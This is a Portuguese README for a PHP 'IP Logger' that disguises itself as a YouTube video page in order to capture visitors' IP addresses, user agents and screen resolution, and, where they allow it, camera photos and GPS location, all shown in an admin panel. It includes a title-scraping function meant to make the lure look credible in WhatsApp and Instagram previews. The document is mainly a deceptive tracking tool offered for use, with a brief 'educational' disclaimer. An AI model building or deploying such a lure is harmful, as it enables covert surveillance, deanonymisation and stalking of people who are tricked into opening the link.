
# 🎯 IPLogger
IP Logger feito com PHP, HTML, JavaScript e CSS (SEM SQL) 🚀

<hr>

### ⚙️ Configuração
1. Edite o arquivo `7xqKWj2di/config.php`. Nele você pode definir o local de armazenamento do arquivo de log:

    > **Padrão:** `/tmp/json.log`  
    > Esse caminho foi escolhido para evitar o acesso ao arquivo pelo ambiente WEB.

2. Defina uma senha para o painel administrativo no mesmo arquivo de configuração.

<hr>

### 📋 Modo de Uso

Depois de configurar o IP Logger no ambiente WEB, as informações serão capturadas sempre que um cliente acessar a página:

```
https://seudominio.com/7xqKWj2di/index.php
```

A página simula uma interface de visualização de vídeo do YouTube:

![Simulação da Página do YouTube](https://raw.githubusercontent.com/them3x/iplogger/main/prints/pagina-youtube.png)

#### 📊 Informações Capturadas
- **Básico:** IP, User-Agent e resolução de tela.
- **Avançado:** Caso o usuário permita, a página também poderá capturar uma foto via câmera e a geolocalização (se o dispositivo tiver GPS).

#### 📎 Parâmetro Dinâmico `si`
Para uma experiência mais realista, você pode adicionar um parâmetro opcional `si` via GET:

```
https://seudominio.com/7xqKWj2di/?si=YOUTUBE-VIDEO-ID
```

O código possui uma função no arquivo `actions.php` que faz o scraping do título do vídeo baseado no ID fornecido:

```php
function getYouTubeTitle($videoId) {
    $url = "https://www.youtube.com/watch?v=" . $videoId;
    $html = file_get_contents($url);
    if ($html !== false) {
        preg_match("/<title>(.*?)<\/title>/", $html, $matches);
        if (isset($matches[1])) {
            $title = str_replace(" - YouTube", "", $matches[1]);
            return $title;
        }
    }
    return "TOP 5 motivos para comprar BITCOIN";
}
```

Esse detalhe permite que aplicativos como WhatsApp ou Instagram carreguem parcialmente informações do vídeo, tornando o IP Logger mais crível:

![Pré-visualização no WhatsApp](https://raw.githubusercontent.com/them3x/iplogger/refs/heads/main/prints/print-wpp.png)

<hr>

### 🔒 Painel Administrativo

O painel administrativo permite visualizar e gerenciar os dados capturados. Ele pode ser acessado através da URL principal:

```
https://seudominio.com/
```

A página de administração exibe todas as informações coletadas com sucesso:

![Painel Administrativo](https://raw.githubusercontent.com/them3x/iplogger/main/prints/adm.png)

---

### 🛠️ Tecnologias Utilizadas
- PHP
- HTML
- CSS
- JavaScript

### 🚧 Observações
Este projeto foi criado para fins educacionais e demonstração. Use com responsabilidade. ⚠️

---

(Sujeito a alterações)
